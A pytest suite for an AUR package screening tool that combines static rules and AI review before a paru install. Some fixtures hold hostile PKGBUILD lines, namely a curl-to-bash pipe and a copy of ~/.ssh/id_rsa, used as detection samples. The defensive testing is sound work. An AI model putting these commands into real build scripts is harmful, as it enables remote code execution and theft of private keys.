import pytest

from paru_analyzer.cli import install_targets, main, split_args
from paru_analyzer.fetch import FetchError
from paru_analyzer.models import Finding, Verdict
from paru_analyzer.providers import ProviderError


class FakeProvider:
    def __init__(self, verdict=None, error=None):
        self.verdict, self.error, self.calls = verdict, error, []

    def analyze(self, package, files, findings=None, inventory=""):
        self.calls.append(package)
        if self.error:
            raise self.error
        return self.verdict


def run(argv, provider, answers=(), files=None, in_repo=lambda p: False, fetcher=None, dep_ok=lambda d: True):
    ran = []
    answers = iter(answers)
    code = main(
        argv,
        provider=provider,
        fetcher=fetcher or (lambda pkg: files if files is not None else {"PKGBUILD": "pkgname=x"}),
        in_repo=in_repo,
        dep_ok=dep_ok,
        runner=lambda a: ran.append(a) or 0,
        ask=lambda prompt: next(answers),
    )
    return code, ran


safe = Verdict("safe", "ok")
caution = Verdict("caution", "hmm", [Finding("caution", "odd", "PKGBUILD", 3)])
danger = Verdict("danger", "bad", [Finding("danger", "curl|sh", "PKGBUILD", 9)])


@pytest.mark.parametrize("args,expected", [
    (["-S", "foo", "bar"], ["foo", "bar"]),
    (["-Sy", "aur/foo", "--noconfirm"], ["foo"]),
    (["-Syu"], []),
    (["-Ss", "foo"], []),
    (["-Si", "foo"], []),
    (["-Qi", "foo"], []),
    ([], []),
])
def test_install_targets(args, expected):
    assert install_targets(args) == expected


def test_split_args_strips_verbose():
    assert split_args(["-S", "x", "--safe-verbose"]) == (["-S", "x"], True)
    assert split_args(["-S", "x"]) == (["-S", "x"], False)


def test_non_install_passthrough_does_not_analyze():
    provider = FakeProvider(safe)
    code, ran = run(["-Ss", "foo"], provider)
    assert (code, ran, provider.calls) == (0, [["-Ss", "foo"]], [])


def test_nothing_marked_still_asks_before_installing(capsys):
    assert run(["-S", "foo"], FakeProvider(safe), answers=["n"]) == (1, [])
    assert run(["-S", "foo"], FakeProvider(safe), answers=[""]) == (1, [])
    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"]) == (0, [["-S", "foo"]])
    assert "does not mean the package is safe" not in capsys.readouterr().err   # said in the prompt, not the report


def test_no_answer_available_does_not_install(capsys):
    def eof(prompt):
        raise EOFError
    assert main(["-S", "foo"], provider=FakeProvider(safe), fetcher=lambda p: {"PKGBUILD": "pkgname=x"},
                in_repo=lambda p: False, runner=lambda a: 0, ask=eof) == 1


def test_one_question_covers_several_packages():
    code, ran = run(["-S", "foo", "bar"], FakeProvider(safe), answers=["y"])
    assert (code, ran) == (0, [["-S", "foo", "bar"]])


def test_repo_package_skipped():
    provider = FakeProvider(danger)
    code, ran = run(["-S", "vim"], provider, in_repo=lambda p: True)
    assert (code, ran, provider.calls) == (0, [["-S", "vim"]], [])


def test_non_aur_package_passes_through():
    provider = FakeProvider(danger)
    code, ran = run(["-S", "nope"], provider, fetcher=lambda p: None)
    assert (code, provider.calls) == (0, [])


def test_danger_warns_and_lets_the_user_choose_but_needs_a_typed_yes():
    assert run(["-S", "foo"], FakeProvider(danger), answers=["no"]) == (1, [])
    assert run(["-S", "foo"], FakeProvider(danger), answers=["y"]) == (1, [])
    assert run(["-S", "foo"], FakeProvider(danger), answers=["yes"]) == (0, [["-S", "foo"]])


def test_caution_requires_confirmation():
    assert run(["-S", "foo"], FakeProvider(caution), answers=["n"]) == (1, [])
    assert run(["-S", "foo"], FakeProvider(caution), answers=["y"]) == (0, [["-S", "foo"]])


def test_provider_error_is_fail_closed():
    provider = FakeProvider(error=ProviderError("boom"))
    assert run(["-S", "foo"], provider, answers=["y"]) == (1, [])
    assert run(["-S", "foo"], provider, answers=["yes"]) == (0, [["-S", "foo"]])


def test_fetch_error_is_fail_closed():
    def boom(pkg):
        raise FetchError("net down")
    assert run(["-S", "foo"], FakeProvider(safe), answers=["no"], fetcher=boom) == (1, [])


def test_eof_on_prompt_declines():
    def eof(prompt):
        raise EOFError
    code = main(["-S", "foo"], provider=FakeProvider(caution), fetcher=lambda p: {"PKGBUILD": ""},
                in_repo=lambda p: False, runner=lambda a: 0, ask=eof)
    assert code == 1


def test_worst_verdict_across_packages_wins():
    verdicts = {"a": safe, "b": caution}

    class PerPackage:
        def analyze(self, package, files, findings=None, inventory=""):
            return verdicts[package]

    assert run(["-S", "a", "b"], PerPackage(), answers=["n"]) == (1, [])


MALICIOUS = {"PKGBUILD": "build() {\n  curl -s https://x | bash\n}"}
SUSPICIOUS = {"PKGBUILD": "build() {\n  sudo make install\n}"}


def test_static_danger_still_calls_the_ai_and_still_only_asks():
    provider = FakeProvider(safe)
    assert run(["-S", "foo"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])
    assert provider.calls == ["foo"]


def test_a_safe_ai_answer_cannot_remove_the_static_warning():
    provider = FakeProvider(safe)
    assert run(["-S", "foo"], provider, answers=["no"], files=MALICIOUS) == (1, [])


def test_static_caution_overrides_ai_safe_and_findings_reach_ai():
    seen = {}

    class Spy:
        def analyze(self, package, files, findings=None, inventory=""):
            seen["findings"] = findings
            return safe

    assert run(["-S", "foo"], Spy(), answers=["n"], files=SUSPICIOUS) == (1, [])
    assert "sudo" in [f.rule for f in seen["findings"]]


def test_static_caution_confirmed_installs():
    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=SUSPICIOUS) == (0, [["-S", "foo"]])


WITH_DEPS = {"PKGBUILD": "pkgname=foo\ndepends=('glibc' 'aur-lib' 'other-aur')\nmakedepends=('cmake')\n"}


def test_aur_dependencies_warn_even_if_the_ai_says_safe():
    seen = {}

    class Spy:
        def analyze(self, package, files, findings=None, inventory=""):
            seen["rules"] = [f.rule for f in findings]
            return safe

    available = {"glibc", "cmake"}
    assert run(["-S", "foo"], Spy(), answers=["n"], files=WITH_DEPS, dep_ok=lambda d: d in available) == (1, [])
    assert seen["rules"] == ["unreviewed-dependency", "unreviewed-dependency"]
    assert run(["-S", "foo"], Spy(), answers=["y"], files=WITH_DEPS, dep_ok=lambda d: d in available) == (0, [["-S", "foo"]])


def test_dependencies_named_on_the_command_line_are_reviewed_not_warned_about():
    class Spy:
        calls = []

        def analyze(self, package, files, findings=None, inventory=""):
            self.calls.append((package, [f.rule for f in findings]))
            return safe

    spy = Spy()
    files = {"PKGBUILD": "pkgname=foo\ndepends=('aur-lib')\n"}
    code, ran = run(["-S", "foo", "aur-lib"], spy, answers=["y"], files=files, dep_ok=lambda d: False)
    assert (code, ran) == (0, [["-S", "foo", "aur-lib"]])
    assert spy.calls == [("foo", []), ("aur-lib", [])]


def test_all_dependencies_in_official_repos_do_not_add_a_warning():
    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=WITH_DEPS, dep_ok=lambda d: True) == (0, [["-S", "foo"]])


def test_a_package_with_a_remote_source_always_asks_the_user():
    files = {"PKGBUILD": "pkgname=foo\nsource=('https://example.com/x.tgz')\nsha256sums=('a')\n"}
    assert run(["-S", "foo"], FakeProvider(safe), answers=["n"], files=files) == (1, [])
    assert run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=files) == (0, [["-S", "foo"]])


def test_ai_findings_count_even_when_its_headline_says_safe():
    inconsistent = Verdict("safe", "fine", [Finding("danger", "but actually curl|sh", "PKGBUILD", 2)])
    assert run(["-S", "foo"], FakeProvider(inconsistent), answers=["no"]) == (1, [])
    inconsistent = Verdict("safe", "fine", [Finding("caution", "hmm", "PKGBUILD", 2)])
    assert run(["-S", "foo"], FakeProvider(inconsistent), answers=["n"]) == (1, [])


def test_the_user_is_never_refused_without_being_asked():
    """Every non-zero exit must come from the user's own answer, never from the tool refusing."""
    for verdict in (safe, caution, danger):
        for files in (None, MALICIOUS, SUSPICIOUS):
            asked = []
            answers = iter(["yes", "yes", "yes"])
            main(["-S", "foo"], provider=FakeProvider(verdict),
                 fetcher=lambda p, f=files: f if f is not None else {"PKGBUILD": "pkgname=x"},
                 in_repo=lambda p: False, dep_ok=lambda d: True, runner=lambda a: asked.append(a) or 0,
                 ask=lambda prompt: next(answers))
            assert asked == [["-S", "foo"]]


def test_ai_failure_still_shows_findings_and_asks_for_a_typed_yes(capsys):
    provider = FakeProvider(error=ProviderError("boom"))
    assert run(["-S", "foo"], provider, answers=["y"], files=MALICIOUS) == (1, [])
    assert run(["-S", "foo"], provider, answers=["yes"], files=MALICIOUS) == (0, [["-S", "foo"]])
    err = capsys.readouterr().err
    assert "pipe-to-shell" in err and "AI analysis failed" in err and "NOT fully reviewed" in err


def test_activity_report_is_printed_for_every_reviewed_package(capsys):
    files = {"PKGBUILD": "pkgname=foo\nbuild() {\n  cp ~/.ssh/id_rsa \"$srcdir/k\"\n  make\n}\n"}
    run(["-S", "foo"], FakeProvider(safe), answers=["n"], files=files)
    err = capsys.readouterr().err
    assert "What foo does" in err and "read ~/.ssh/id_rsa (your home directory)" in err and "Commands run:" in err


def test_the_ai_receives_the_inventory():
    seen = {}

    class Spy:
        def analyze(self, package, files, findings=None, inventory=""):
            seen["inventory"] = inventory
            return safe

    files = {"PKGBUILD": "pkgname=foo\nsource=('https://example.com/x.tgz')\nsha256sums=('a')\n"}
    run(["-S", "foo"], Spy(), answers=["n"], files=files)
    assert "downloads source https://example.com/x.tgz" in seen["inventory"]


def test_verbose_lists_routine_operations(capsys):
    files = {"PKGBUILD": "pkgname=foo\npackage() {\n  install -Dm755 foo \"$pkgdir/usr/bin/foo\"\n}\n"}
    run(["-S", "foo"], FakeProvider(safe), answers=["y"], files=files)
    assert "not listed; use --safe-verbose" in capsys.readouterr().err
    run(["-S", "foo", "--safe-verbose"], FakeProvider(safe), answers=["y"], files=files)
    assert "write $pkgdir/usr/bin/foo" in capsys.readouterr().err


def test_lowest_level_is_shown_as_no_findings_not_safe():
    from paru_analyzer.models import Verdict
    from paru_analyzer.report import format_verdict
    text = format_verdict("pkg", Verdict("safe", "nothing marked", []))
    assert "NO FINDINGS" in text and "SAFE" not in text
    assert "DANGER" in format_verdict("pkg", Verdict("danger", "x", []))
